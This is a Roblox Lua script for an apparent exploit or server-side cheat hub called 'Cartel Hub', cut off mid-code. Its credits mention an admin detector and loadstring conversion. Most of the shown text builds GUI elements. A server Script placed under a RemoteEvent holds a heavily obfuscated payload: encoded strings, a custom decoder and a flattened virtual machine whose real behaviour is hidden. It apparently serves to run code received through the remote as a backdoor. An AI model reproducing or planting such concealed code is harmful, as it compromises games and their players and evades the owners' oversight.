local username = "MdsMdle"
print(username)
--[[

CARTEL HUB

Credits:
    GUI - irisk
    Notification System - irisk
    Admin Detector - irisk
    Auto Convert + Loadstring - adiont
    Inspiration from SSP's packages



]]--

--Converted with ttyyuu12345's model to script plugin v4
function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k=="script" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
ScreenGui0 = Instance.new("ScreenGui")
Frame1 = Instance.new("Frame")
TextLabel2 = Instance.new("TextLabel")
Folder3 = Instance.new("Folder")
TextLabel4 = Instance.new("TextLabel")
TextLabel5 = Instance.new("TextLabel")
LocalScript6 = Instance.new("LocalScript")
Folder7 = Instance.new("Folder")
ScrollingFrame8 = Instance.new("ScrollingFrame")
UIListLayout9 = Instance.new("UIListLayout")
RemoteEvent10 = Instance.new("RemoteEvent")
Script11 = Instance.new("Script")
ModuleScript12 = Instance.new("ModuleScript")
TextBox13 = Instance.new("TextBox")
Frame14 = Instance.new("Frame")
ImageLabel15 = Instance.new("ImageLabel")
ImageLabel16 = Instance.new("ImageLabel")
ImageLabel17 = Instance.new("ImageLabel")
LocalScript18 = Instance.new("LocalScript")
TextButton19 = Instance.new("TextButton")
Frame20 = Instance.new("Frame")
ImageLabel21 = Instance.new("ImageLabel")
ImageLabel22 = Instance.new("ImageLabel")
ImageLabel23 = Instance.new("ImageLabel")
TextButton24 = Instance.new("TextButton")
Frame25 = Instance.new("Frame")
ImageLabel26 = Instance.new("ImageLabel")
ImageLabel27 = Instance.new("ImageLabel")
ImageLabel28 = Instance.new("ImageLabel")
Script29 = Instance.new("Script")
ModuleScript30 = Instance.new("ModuleScript")
Model31 = Instance.new("Model")
LocalScript32 = Instance.new("LocalScript")
NumberValue33 = Instance.new("NumberValue")
StringValue34 = Instance.new("StringValue")
Animation35 = Instance.new("Animation")
StringValue36 = Instance.new("StringValue")
Animation37 = Instance.new("Animation")
StringValue38 = Instance.new("StringValue")
Animation39 = Instance.new("Animation")
StringValue40 = Instance.new("StringValue")
Animation41 = Instance.new("Animation")
StringValue42 = Instance.new("StringValue")
Animation43 = Instance.new("Animation")
StringValue44 = Instance.new("StringValue")
Animation45 = Instance.new("Animation")
StringValue46 = Instance.new("StringValue")
Animation47 = Instance.new("Animation")
StringValue48 = Instance.new("StringValue")
Animation49 = Instance.new("Animation")
NumberValue50 = Instance.new("NumberValue")
Animation51 = Instance.new("Animation")
NumberValue52 = Instance.new("NumberValue")
Script53 = Instance.new("Script")
Script54 = Instance.new("Script")
LocalScript55 = Instance.new("LocalScript")
Part56 = Instance.new("Part")
RemoteEvent57 = Instance.new("RemoteEvent")
Motor6D58 = Instance.new("Motor6D")
Humanoid59 = Instance.new("Humanoid")
LocalScript60 = Instance.new("LocalScript")
Script61 = Instance.new("Script")
Part62 = Instance.new("Part")
RemoteEvent63 = Instance.new("RemoteEvent")
Part64 = Instance.new("Part")
RemoteEvent65 = Instance.new("RemoteEvent")
Part66 = Instance.new("Part")
RemoteEvent67 = Instance.new("RemoteEvent")
Part68 = Instance.new("Part")
RemoteEvent69 = Instance.new("RemoteEvent")
Part70 = Instance.new("Part")
Decal71 = Instance.new("Decal")
RemoteEvent72 = Instance.new("RemoteEvent")
Motor6D73 = Instance.new("Motor6D")
Motor6D74 = Instance.new("Motor6D")
Motor6D75 = Instance.new("Motor6D")
Motor6D76 = Instance.new("Motor6D")
Motor6D77 = Instance.new("Motor6D")
Part78 = Instance.new("Part")
Decal79 = Instance.new("Decal")
Sound80 = Instance.new("Sound")
RemoteEvent81 = Instance.new("RemoteEvent")
Sound82 = Instance.new("Sound")
RemoteEvent83 = Instance.new("RemoteEvent")
Sound84 = Instance.new("Sound")
RemoteEvent85 = Instance.new("RemoteEvent")
Sound86 = Instance.new("Sound")
RemoteEvent87 = Instance.new("RemoteEvent")
Sound88 = Instance.new("Sound")
RemoteEvent89 = Instance.new("RemoteEvent")
Sound90 = Instance.new("Sound")
RemoteEvent91 = Instance.new("RemoteEvent")
Sound92 = Instance.new("Sound")
RemoteEvent93 = Instance.new("RemoteEvent")
Sound94 = Instance.new("Sound")
RemoteEvent95 = Instance.new("RemoteEvent")
Sound96 = Instance.new("Sound")
RemoteEvent97 = Instance.new("RemoteEvent")
SpecialMesh98 = Instance.new("SpecialMesh")
RemoteEvent99 = Instance.new("RemoteEvent")
Sound100 = Instance.new("Sound")
RemoteEvent101 = Instance.new("RemoteEvent")
Sound102 = Instance.new("Sound")
RemoteEvent103 = Instance.new("RemoteEvent")
Sound104 = Instance.new("Sound")
RemoteEvent105 = Instance.new("RemoteEvent")
Sound106 = Instance.new("Sound")
RemoteEvent107 = Instance.new("RemoteEvent")
Sound108 = Instance.new("Sound")
RemoteEvent109 = Instance.new("RemoteEvent")
Sound110 = Instance.new("Sound")
RemoteEvent111 = Instance.new("RemoteEvent")
Sound112 = Instance.new("Sound")
RemoteEvent113 = Instance.new("RemoteEvent")
Sound114 = Instance.new("Sound")
RemoteEvent115 = Instance.new("RemoteEvent")
Sound116 = Instance.new("Sound")
RemoteEvent117 = Instance.new("RemoteEvent")
Sound118 = Instance.new("Sound")
RemoteEvent119 = Instance.new("RemoteEvent")
Sound120 = Instance.new("Sound")
RemoteEvent121 = Instance.new("RemoteEvent")
Sound122 = Instance.new("Sound")
RemoteEvent123 = Instance.new("RemoteEvent")
Sound124 = Instance.new("Sound")
RemoteEvent125 = Instance.new("RemoteEvent")
Sound126 = Instance.new("Sound")
RemoteEvent127 = Instance.new("RemoteEvent")
Sound128 = Instance.new("Sound")
RemoteEvent129 = Instance.new("RemoteEvent")
Sound130 = Instance.new("Sound")
RemoteEvent131 = Instance.new("RemoteEvent")
Sound132 = Instance.new("Sound")
RemoteEvent133 = Instance.new("RemoteEvent")
Sound134 = Instance.new("Sound")
RemoteEvent135 = Instance.new("RemoteEvent")
ImageButton136 = Instance.new("ImageButton")
Script137 = Instance.new("Script")
LocalScript138 = Instance.new("LocalScript")
Script139 = Instance.new("Script")
TextButton140 = Instance.new("TextButton")
LocalScript141 = Instance.new("LocalScript")
RemoteEvent142 = Instance.new("RemoteEvent")
LocalScript143 = Instance.new("LocalScript")
Script144 = Instance.new("Script")
ModuleScript145 = Instance.new("ModuleScript")
Frame146 = Instance.new("Frame")
TextLabel147 = Instance.new("TextLabel")
TextLabel148 = Instance.new("TextLabel")
Frame149 = Instance.new("Frame")
Frame150 = Instance.new("Frame")
LocalScript151 = Instance.new("LocalScript")
LocalScript152 = Instance.new("LocalScript")
Script153 = Instance.new("Script")
RemoteEvent154 = Instance.new("RemoteEvent")
Folder155 = Instance.new("Folder")
ScreenGui0.Name = "ASJKDLKJHLKJDSF"
ScreenGui0.Parent = mas
ScreenGui0.ResetOnSpawn = false
Frame1.Parent = ScreenGui0
Frame1.Position = UDim2.new(0.395999998, 0, 0.406947881, 0)
Frame1.Size = UDim2.new(0, 259, 0, 149)
Frame1.BackgroundColor = BrickColor.new("Institutional white")
Frame1.BackgroundColor3 = Color3.new(1, 1, 1)
Frame1.BorderColor = BrickColor.new("Really black")
Frame1.BorderColor3 = Color3.new(0, 0, 0)
Frame1.BorderSizePixel = 0
TextLabel2.Name = "Title"
TextLabel2.Parent = Frame1
TextLabel2.Size = UDim2.new(0, 118, 0, 34)
TextLabel2.BackgroundColor = BrickColor.new("Institutional white")
TextLabel2.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel2.BackgroundTransparency = 1
TextLabel2.BorderColor = BrickColor.new("Really black")
TextLabel2.BorderColor3 = Color3.new(0, 0, 0)
TextLabel2.BorderSizePixel = 0
TextLabel2.ZIndex = 11
TextLabel2.Font = Enum.Font.Unknown
TextLabel2.FontSize = Enum.FontSize.Size24
TextLabel2.Text = "Cartel Hub"
TextLabel2.TextColor = BrickColor.new("Institutional white")
TextLabel2.TextColor3 = Color3.new(1, 1, 1)
TextLabel2.TextSize = 22
Folder3.Name = "LoadingInstances"
Folder3.Parent = Frame1
TextLabel4.Name = "Loading"
TextLabel4.Parent = Folder3
TextLabel4.Position = UDim2.new(0.115830116, 0, 0.335570484, 0)
TextLabel4.Visible = false
TextLabel4.Size = UDim2.new(0, 200, 0, 50)
TextLabel4.BackgroundColor = BrickColor.new("Institutional white")
TextLabel4.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel4.BackgroundTransparency = 1
TextLabel4.BorderColor = BrickColor.new("Really black")
TextLabel4.BorderColor3 = Color3.new(0, 0, 0)
TextLabel4.BorderSizePixel = 0
TextLabel4.ZIndex = 12
TextLabel4.Font = Enum.Font.Unknown
TextLabel4.FontSize = Enum.FontSize.Size24
TextLabel4.Text = "Loading scripts..."
TextLabel4.TextColor = BrickColor.new("Institutional white")
TextLabel4.TextColor3 = Color3.new(1, 1, 1)
TextLabel4.TextSize = 22
TextLabel5.Name = "Creds"
TextLabel5.Parent = Folder3
TextLabel5.Position = UDim2.new(0.111969113, 0, 0.724832237, 0)
TextLabel5.Visible = false
TextLabel5.Size = UDim2.new(0, 200, 0, 32)
TextLabel5.BackgroundColor = BrickColor.new("Institutional white")
TextLabel5.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel5.BackgroundTransparency = 1
TextLabel5.BorderColor = BrickColor.new("Really black")
TextLabel5.BorderColor3 = Color3.new(0, 0, 0)
TextLabel5.BorderSizePixel = 0
TextLabel5.ZIndex = 12
TextLabel5.Font = Enum.Font.Unknown
TextLabel5.FontSize = Enum.FontSize.Size18
TextLabel5.Text = "Made by irisk_"
TextLabel5.TextColor = BrickColor.new("Institutional white")
TextLabel5.TextColor3 = Color3.new(1, 1, 1)
TextLabel5.TextSize = 15
LocalScript6.Name = "Smooth GUI Dragging"
LocalScript6.Parent = Frame1
table.insert(cors,sandbox(LocalScript6,function()
local UserInputService = game:GetService("UserInputService")
local runService = (game:GetService("RunService"));

local gui = script.Parent

local dragging
local dragInput
local dragStart
local startPos

function Lerp(a, b, m)
	return a + (b - a) * m
end;

local lastMousePos
local lastGoalPos
local DRAG_SPEED = (8); -- // The speed of the UI darg.
function Update(dt)
	if not (startPos) then return end;
	if not (dragging) and (lastGoalPos) then
		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
		return 
	end;

	local delta = (lastMousePos - UserInputService:GetMouseLocation())
	local xGoal = (startPos.X.Offset - delta.X);
	local yGoal = (startPos.Y.Offset - delta.Y);
	lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
	gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
end;

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position
		lastMousePos = UserInputService:GetMouseLocation()

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

runService.Heartbeat:Connect(Update)
end))
Folder7.Name = "Main"
Folder7.Parent = Frame1
ScrollingFrame8.Parent = Folder7
ScrollingFrame8.Position = UDim2.new(0.019693654, 0, 0.1328125, 0)
ScrollingFrame8.Visible = false
ScrollingFrame8.Size = UDim2.new(0, 438, 0, 179)
ScrollingFrame8.Active = true
ScrollingFrame8.BackgroundColor = BrickColor.new("Institutional white")
ScrollingFrame8.BackgroundColor3 = Color3.new(1, 1, 1)
ScrollingFrame8.BackgroundTransparency = 1
ScrollingFrame8.BorderColor = BrickColor.new("Really black")
ScrollingFrame8.BorderColor3 = Color3.new(0, 0, 0)
ScrollingFrame8.BorderSizePixel = 0
ScrollingFrame8.ZIndex = 11
ScrollingFrame8.CanvasSize = UDim2.new(0, 0, 0, 0)
UIListLayout9.Parent = ScrollingFrame8
UIListLayout9.SortOrder = Enum.SortOrder.LayoutOrder
RemoteEvent10.Parent = Folder7
Script11.Parent = RemoteEvent10
table.insert(cors,sandbox(Script11,function()
return(function(...)local b={"\113\088\087\103\113\088\086\072","\067\088\117\072\047\118\117\072\113\082\106\065\113\102\049\052";"\089\088\086\054\089\077\061\061";"\089\088\120\065\085\115\081\071";"\089\108\081\120\113\068\061\061","\105\056\106\079\086\047\120\101\097\116\084\057\102\088\107\120\109\107\061\061";"\081\057\117\053\048\086\106\070\097\108\105\071\118\102\086\084\067\077\061\061","\089\102\049\050\047\108\090\061","\074\111\068\052\089\056\071\105\074\068\061\061","\047\080\090\061","\074\117\105\104\118\082\086\081\077\057\106\055\089\073\117\110\057\079\061\061";"\110\118\052\065\104\086\089\090\097\057\071\066\047\052\089\051\057\086\090\061";"\087\085\112\085\066\077\061\061";"\067\102\117\054\047\108\089\052","\085\080\106\083\067\118\067\075\097\118\085\051\113\118\049\106\048\118\068\061","\074\068\061\061","\085\115\087\103\085\118\120\111\089\082\090\061","\067\108\106\043\048\118\075\083","\047\072\052\115\104\083\122\122\057\112\065\111\089\057\085\111\101\077\061\061";"\085\118\075\107\113\118\081\076";"\047\080\106\120\057\118\052\088\077\117\105\050\118\083\110\043\081\083\079\061";"\106\088\117\072\077\082\081\075\047\102\110\061";"\117\083\112\055\057\102\085\057\081\119\070\102\067\102\117\050\097\055\073\061";"\110\053\112\107\097\108\086\080\085\088\072\055\077\108\089\050\117\077\061\061","\089\082\052\097\110\057\054\088\077\097\089\088\097\082\071\075\104\097\079\061","\048\097\070\051\110\057\122\051\074\112\117\076\106\088\087\118";"\077\068\106\108\118\069\072\052";"\117\115\086\054\067\115\117\043\090\112\106\052\085\115\117\119\085\115\117\073\090\077\061\061","\118\112\105\111\104\052\122\081\117\073\087\110\047\115\089\082","\081\117\122\083\113\108\105\090\118\053\057\049\097\057\054\051","\077\088\087\103\047\102\117\119\085\079\061\061";"\101\055\050\108\118\119\118\077\119\089\090\116\068\077\119\101\081\101\068\102\116\072\072\052\100\083\099\120\080\108\105\054\080\085\082\073\079\051\068\087\084\102\118\052\089\109\090\082\101\078\077\079\054\101\071\113\122\117\086\114\112\043\116\105\079\074\047\080\069\115\043\081\055\082\073\075\084\100\081\088\090\055\088\057\087\081\118\109\100\108\120\066\097\084\051\066\047\075\102\100\105\049\087\118\110\110\077\117\079\079\115\102\073\088\071\122\102\087\090\067\120\085\084\057\073\077\061\061","\047\080\112\061";"\047\072\086\120\081\082\086\050\101\102\106\073\118\052\090\061";"\047\118\086\072\048\079\061\061";"\106\088\117\072\057\088\117\043\085\102\052\119\089\077\061\061","\082\120\087\083\113\107\061\061";"\110\052\089\122\048\055\122\122\048\079\061\061","\067\088\081\043\048\082\070\072";"\082\120\087\054\089\082\106\065\085\115\086\111\047\115\057\061";"\082\120\087\078\089\118\066\061";"\047\108\113\049\106\052\065\115\118\115\110\061","\081\086\086\081\110\080\070\102\048\088\106\069\048\118\054\054\085\057\090\061";"\047\115\117\103","\074\057\107\055\089\055\117\071\081\119\052\057\104\112\077\120","\113\088\065\065\067\068\061\061";"\067\102\086\103\089\115\087\054","\067\115\081\065\047\115\107\061","\065\048\121\076\120\118\118\099\122\051\049\104\090\077\061\061";"\082\120\087\105\047\102\106\052\101\079\061\061","\113\083\052\072\089\077\061\061","\067\102\117\049\085\118\052\043\089\077\061\061";"\099\072\052\056\065\085\072\104\100\077\110\073\083\101\072\061","\089\082\122\043\047\108\090\061","\085\115\086\111\047\115\057\061","\101\080\065\080\047\073\081\052\118\073\067\107\089\097\081\066\085\057\090\061";"";"\085\115\087\055\085\053\122\105\047\102\067\061"}for N,z in ipairs({{951870+-951869,592946+-592888},{370284-370283;572804-572786},{200505-200486,-196716-(-196774)}})do while z[-84642-(-84643)]<z[-338026+338028]do b[z[-610291+610292]],b[z[893502-893500]],z[-645491-(-645492)],z[407917+-407915]=b[z[-749941-(-749943)]],b[z[917053-917052]],z[790328+-790327]+(289513+-289512),z[-285095-(-285097)]-(-431852-(-431853))end end local function N(N)return b[N-(-1010353-(-1046016))]end do local N=math.floor local z=table.insert local a={f=-477385-(-477423),S=-459271-(-459310);H=-576242+576294,Z=-772472+772480,["\056"]=918590-918588;V=436979-436974,J=848378+-848364;W=885563+-885502;["\047"]=-935101+935128,a=-743204-(-743223);n=15788-15776;Q=937085+-937072,u=-736375+736396;["\049"]=-1016704+1016753,j=-449006+449023,T=-505712+505754,P=756346-756343,D=-1005215-(-1005247),e=399882-399852;G=-866771-(-866811);O=-648372+648372,["\053"]=-461031-(-461038);["\054"]=-890684+890729,x=145124+-145071,d=608958-608947,["\051"]=-227943+227953;w=-1026781-(-1026816);p=921277+-921273,z=126381-126372;["\057"]=-871611+871631;L=505243-505200,C=-921917+921945,l=-318698+318753,q=250152+-250128;B=664565+-664509;i=468335+-468294,Y=-1004095+1004120,A=174022-173989,["\043"]=-147187-(-147237),X=227111+-227057,U=416749+-416720;b=-537523-(-537585);o=-31905+31939,g=-377068+377114;["\055"]=-163621+163672;R=-801209+801232;E=923980-923965,m=-206188-(-206246);v=-950823-(-950845);s=853120-853114,h=-108195+108213;k=484831-484783;I=285673+-285637,r=-90147+90210,["\052"]=673050-673013;t=-603832-(-603891);y=-756952-(-756983),["\050"]=848890+-848843,M=-289305-(-289321);F=-714934+714935,["\048"]=271810-271784;K=327850+-327793,c=189350+-189290;N=-444290-(-444334)}local v=string.len local d=table.concat local X=string.char local A=string.sub local M=type local o=b for b=829179-829178,#o,-286184-(-286185)do local x=o[b]if M(x)=="\115\116\114\105\110\103"then local M=v(x)local J={}local I=-241446-(-241447)local Y=452654-452654 local Z=316842-316842 while I<=M do local b=A(x,I,I)local v=a[b]if v then Y=Y+v*(103203+-103139)^((-864699+864702)-Z)Z=Z+(787000+-786999)if Z==-711542+711546 then Z=-965758-(-965758)local b=N(Y/(191398+-125862))local a=N((Y%(598129-532593))/(103459+-103203))local v=Y%(753079+-752823)z(J,X(b,a,v))Y=931581+-931581 end elseif b=="\061"then z(J,X(N(Y/(-293417+358953))))if I>=M or A(x,I+(178663-178662),I+(514545-514544))~="\061"then z(J,X(N((Y%(77856-12320))/(679669-679413))))end break end I=I+(-599282-(-599283))end o[b]=d(J)end end end return(function(b,a,v,d,X,A,M,Y,x,T,o,J,V,E,m,z,l,Z,P,k,I,D)Z,z,o,m,V,Y,l,T,x,k,D,J,P,I,E=function(b)local N,z=918717-918716,b[-669685+669686]while z do x[z],N=x[z]-(-964733-(-964734)),N+(267432+-267431)if x[z]==-208102+208102 then x[z],o[z]=nil,nil end z=b[N]end end,function(z,v,d,X)local c,u,r,O,Y,e,G,K,s,W,h,R,g,M,i,Q,w,S,B,F,t,q,n,I,x,j,y,U,Z,m,C,f,L,p while z do if z<553585+7625112 then if z<3478106-(-511152)then if z<1689851-(-748343)then if z<943417-(-776056)then if z<902588+546151 then if z<36961+868177 then if z<386028+-67791 then z=o[d[436974+-436973]]x=v[830970+-830969]I=v[-276329+276331]Y=z z=Y[I]z=z and-770872+2999164 or 542641+10314138 else G=not e f=f+j W=f<=B W=G and W G=f>=B G=e and G W=G or W G=-447470+14618527 z=W and G W=7494469-462446 z=z or W end else x=N(-329898+365607)M=N(-60230-(-95907))z=b[M]M=z(x)z=b[N(-546737+582429)]M={}end else if z<1132216-(-427565)then o[I]=t z=o[I]z=z and-852026+14612446 or 3974362-506992 else z=o[d[-470638-(-470639)]]W=N(131172-95459)B=3307226295481-549041 j=15713617255750-(-138212)I=v[987201-987199]m=o[d[-100065-(-100067)]]Q=o[d[1039171-1039168]]x=v[687926-687925]y=Q(W,B)Z=m[y]Q=N(987269-951549)M=N(-743553-(-779256))M=z[M]f=N(-683765+719459)Y=Z..I M=M(z,Y)Y=M M=N(-1041024+1076699)z=b[M]m=b[Q]y=o[d[-484333-(-484335)]]W=o[d[224487+-224484]]B=W(f,j)Q=y[B]Z=m[Q]M=z(Z)Z=J()o[Z]=M M=N(936151-900476)z=b[M]m=16311977303-(-80675)M=z(m)m=J()I=nil z=V(273832+10501537,{Z;d[499953-499951];d[31841+-31838],m})o[m]=M Q=z z=Q(x,Y)Q=nil Z=E(Z)x=nil M={}Y=nil z=b[N(-514800+550511)]m=E(m)end end else if z<208166+2020379 then if z<200934+2019197 then if z<-416237+2602600 then M=K z=R z=-483631+15632126 else w=-594866+594867 z=o[y]i=-424557+424563 n=z(w,i)z=N(-638602-(-674293))b[z]=n i=N(696991-661300)w=b[i]i=-791607-(-791609)z=w>i z=z and 5622860-316842 or 8173209-(-735863)end else z=13044782-(-680821)end else if z<408429+1958395 then z={}I=53667-53666 x=z z=9528004-824250 Y=o[d[-467685-(-467694)]]Z=Y Y=-562416-(-562417)m=Y Y=-294633-(-294633)Q=m<Y Y=I-m else W=171493-171493 B=-759352+759607 z=o[d[462127-462126]]I=Y y=z(W,B)x[I]=y z=438446+8265308 I=nil end end end else if z<3962304-477871 then if z<-537265+3651886 then if z<-604723+3499800 then if z<-537201+3364567 then M=B z=f z=B and 2581358-(-319210)or 5864467-28513 else z=o[d[-332458+332465]]z=z and 2804853-(-846842)or 1658514-(-585138)end else f=-1029376+1029379 B=J()o[B]=M j=-999359+999424 z=o[y]M=z(f,j)p=D(7178172-985855,{})f=J()z=53986+-53986 j=z o[f]=M z=-953534-(-953534)e=z G=N(729399+-693728)M=b[G]G={M(p)}z={a(G)}G=z M=872957-872955 z=G[M]M=N(314971-279273)p=z z=b[M]w=N(783064-747383)U=o[Y]n=b[w]w=n(p)n=N(-595954+631644)t=U(w,n)U={t()}M=z(a(U))U=J()o[U]=M t=o[f]M=-672308-(-672309)n=t t=-333865-(-333866)w=t t=-51106-(-51106)z=6473382-509424 i=w<t t=M-w end else if z<-998015+4235445 then u=-363241-(-363243)c=r[u]u=o[O]h=c==u z=2997563-1015551 K=h else z=true z=963454+8679848 end end else if z<933885+2843169 then if z<-826042+4444529 then G=nil e=nil Y=E(Y)e=J()y=E(y)j=nil W=nil y=N(633335-597619)Q=nil m=E(m)Q=N(753210-717494)U=E(U)Z=E(Z)Y=nil I=E(I)B=E(B)Z=J()p=nil I=nil f=E(f)G={}o[Z]=I I=J()o[I]=Y m=b[Q]Q=N(-692469+728158)Y=m[Q]z=-482543+7647690 m=J()o[m]=Y W=N(-891039-(-926717))Q=b[y]y=N(-578461-(-614131))f=J()U=745399+-745143 Y=Q[y]y=b[W]i=U W=N(-441838+477533)Q=y[W]B=N(-897546-(-933245))j={}W=b[B]B=N(-10464+46133)y=W[B]B=J()W=824250+-824250 o[B]=W W=346155+-346153 o[f]=W p=-239847+239848 W={}o[e]=j U=1006079+-1006078 j=458990+-458990 g=U U=427437-427437 S=g<U U=p-g else x=N(958142+-922465)z=b[x]I=o[d[908348+-908340]]Y=-959166-(-959166)x=z(I,Y)z=2669553-425901 end else if z<4303901-455598 then z=12204629-577266 Y=o[d[834688-834682]]I=Y==x M=I else h=682102-682101 z=764280+14139983 R=r[h]K=R end end end end else if z<6203136-508784 then if z<883579+3586800 then if z<-120996+4533188 then if z<361259+3798935 then if z<-828794+4901037 then z=true z=z and 9159864-(-491631)or 7609992-(-560241)else M={}z=b[N(194342+-158637)]end else I=o[d[-79970+79973]]Y=-933390-(-933437)z=13002349-654580 x=I*Y I=607604-607347 M=x%I o[d[-729140-(-729143)]]=M end else if z<5058357-601395 then z=3345094-(-679349)else B=546865+-546863 j=-410464-(-410477)I=o[d[182761-182758]]Y=507728-507696 x=I%Y Z=o[d[-621935-(-621939)]]y=o[d[125798-125796]]p=o[d[474351+-474348]]G=p-x p=-491471-(-491503)e=G/p f=j-e W=B^f Q=y/W m=Z(Q)Z=4295555826-588530 Y=m%Z m=-1036480+1036482 Z=m^x I=Y/Z W=-421421+421422 Z=o[d[-176485+176489]]y=I%W B=931645-931389 x=nil W=-339371+4295306667 Q=y*W y=23327-(-42209)m=Z(Q)Z=o[d[-440110+440114]]Q=Z(I)Y=m+Q m=-62946+128482 Z=Y%m Q=Y-Z m=Q/y y=624307-624051 Q=Z%y W=Z-Q y=W/B B=-516976+517232 W=m%B f=m-W j=314346+-314090 z=9409920-763000 Z=nil B=f/j m=nil I=nil Y=nil f={Q;y,W;B}W=nil B=nil Q=nil o[d[840442+-840441]]=f y=nil end end else if z<-980542+6383974 then if z<4321282-(-718134)then if z<4080498-(-438894)then M=N(43346-7648)B=V(12497950-(-912764),{})z=b[M]Z=N(-179014-(-214695))x=o[d[-655472-(-655476)]]Y=b[Z]W=N(-576434+612105)y=b[W]W={y(B)}y=-966718+966720 Q={a(W)}m=Q[y]Z=Y(m)Y=N(967742+-932052)I=x(Z,Y)x={I()}M=z(a(x))x=M I=o[d[-603566-(-603571)]]M=I z=I and 4384934-553009 or 614643+11012720 else G=N(-255528+291206)e=b[G]G=N(395180+-359479)j=e[G]z=-760056+3545421 B=j end else g=N(103396-67682)w=N(-651348-(-687029))z=b[w]i=b[g]w=z(i)z=N(-594569-(-630260))b[z]=w z=14187793-(-250536)end else if z<-75426+5574654 then n=j==e t=n z=692597+771255 else S=N(-22369+58085)g=J()o[g]=t L=468398-468143 q=-514992+515092 M=b[S]S=N(989012-953342)z=M[S]O=-363499+363500 S=614132-614131 M=z(S,q)S=J()s=-601203-(-601203)o[S]=M h=N(-192390-(-228071))z=o[y]q=-25569+25569 M=z(q,L)L=757432-757431 q=J()r=239977-239975 o[q]=M z=o[y]C=o[S]M=z(L,C)L=J()o[L]=M M=o[y]C=M(O,r)M=224423+-224422 z=C==M r=N(31777+3920)C=J()M=N(398101-362411)o[C]=z R=b[h]c=o[y]F=-930941+940941 u={c(s,F)}h=R(a(u))R=N(-801225-(-836922))K=h..R z=N(-194534+230220)O=r..K z=p[z]z=z(p,M,O)O=J()K=V(12061201-807097,{y,g,f;Y;I,U;C;O,S,L,q;B})o[O]=z r=N(-482863+518534)M=b[r]r={M(K)}z={a(r)}r=z z=o[C]z=z and-775992+11581058 or 832250+15516409 end end end else if z<7399031-312234 then if z<6178535-(-458158)then if z<63970+5953128 then if z<-57186+5905191 then f=N(-278761+314462)B=b[f]z=-348715+3249283 M=B else t=t+w g=not i M=t<=n M=g and M g=t>=n g=i and g M=g or M g=873531+4769905 z=M and g M=634484+13251380 z=z or M end else M=11804872-(-727223)I=N(-57826+93528)Y=-972286+5886612 x=I^Y z=M-x x=z M=N(479537-443822)z=M/x M={z}z=b[N(-949677-(-985343))]end else if z<-613939+7608477 then i=144164+-144164 U=#G z=-261736+8545125 p=U==i else Q=nil z=13504636-(-220967)y=nil Z=nil end end else if z<7341318-(-734711)then if z<-756599+7930635 then q=not S U=U+g p=U<=i p=q and p q=U>=i q=S and q p=q or p q=795833+10117780 z=p and q p=589682+6329697 z=z or p else Y=-972737-(-972990)I=o[d[711542+-711540]]x=I*Y I=646260+16823899676863 M=x+I x=35184371996381-(-92451)z=M%x o[d[-960958+960960]]=z I=-990399+990400 z=3214913-(-1026112)x=o[d[779896+-779893]]M=x~=I end else if z<8739331-613747 then x=o[d[414509+-414508]]M=#x x=-611379+611379 z=M==x z=z and 35041+7634953 or 1005695+7641225 else z=b[N(-654964+690670)]M={}end end end end end else if z<198438+11850809 then if z<-662261+11038268 then if z<9802298-1013567 then if z<45537+8656713 then if z<-870011+9551854 then if z<-626739+9060934 then U=-177701-(-177702)i=#G p=Y(U,i)U=Q(G,p)q=-722165-(-722166)z=-260456+15600445 i=o[e]S=U-q g=y(S)i[U]=g U=nil p=nil else Y=N(329735-294057)z=b[N(1042749-1007039)]I=b[Y]Y=N(-144375-(-180070))x=I[Y]Y=o[d[-78689-(-78690)]]I={x(Y)}M={a(I)}end else z=true z=z and-942653+16074763 or 141860+9501442 end else if z<-213799+8933767 then Y=Y+m I=Y<=Z y=not Q I=y and I y=Y>=Z y=Q and y I=y or I y=2999355-587762 z=I and y I=10946158-497455 z=z or I else u=1003136-1003135 R=z c=r[u]u=false h=c==u K=h z=h and 3485962-301225 or 248040+1733972 end end else if z<8853703-(-795321)then if z<8864627-(-647860)then if z<-387820+9254707 then z=12438108-977150 Q=o[m]M=Q else i=N(-612403+648094)z=b[i]i=N(162853+-127139)b[i]=z z=13833222-(-605107)end else z=P(4328868-(-110819),{Z})n={z()}M={a(n)}z=b[N(430637+-394937)]end else if z<10708828-986367 then M=N(-238077-(-273768))x=N(33058-(-2656))z=b[M]M=b[x]x=N(641908+-606194)b[x]=z x=N(1063403-1027712)z=4114398-89955 b[x]=M x=o[d[-107107+107108]]I=x()else z=true z=z and 1547534-(-665397)or 83619+3989465 end end end else if z<10613458-(-334378)then if z<321002+10521622 then if z<10196512-(-596338)then if z<11481925-778744 then z=o[d[-412067-(-412077)]]I=o[d[-332063-(-332074)]]x[z]=I z=o[d[1025996-1025984]]I={z(x)}M={a(I)}z=b[N(-778808+814501)]else x=v[425901+-425900]z=o[d[-340075+340076]]M=z(x)x=nil z=nil I=v[-866299+866301]Y=J()Z=J()o[Y]=M o[Z]=z z=k(583730+11864906,{Y,d[-334122+334124];d[-419050-(-419053)];Z;d[453938-453934]})o[Z]=z M=o[Z]Q=o[Y]m=M(I,Q)M=m()Y=E(Y)Z=E(Z)M={}z=b[N(726576-690869)]I=nil end else K=o[I]M=K z=K and-773752+9532291 or 15457017-308522 end else if z<10235916-(-637172)then f=-522223-(-522224)W=N(524080+-488381)z={}o[d[669493+-669491]]=z 